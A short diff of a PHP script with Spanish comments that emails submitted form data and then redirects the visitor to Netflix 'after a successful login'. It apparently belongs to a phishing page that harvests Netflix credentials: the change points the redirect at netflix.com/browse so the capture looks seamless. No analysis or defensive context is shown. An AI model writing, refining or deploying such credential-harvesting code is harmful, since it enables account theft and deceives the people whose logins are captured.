@@ -26,7 +26,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Enviar el correo
     if (mail($to, $subject, $message, $headers)) {
         // Redirigir a la página principal de Netflix después de un login exitoso
-        header('Location: https://www.netflix.com');
+        header('Location: https://www.netflix.com/browse');
         exit;  // Termina la ejecución del script después de la redirección
     } else {
         echo "Hubo un problema al enviar el correo.";
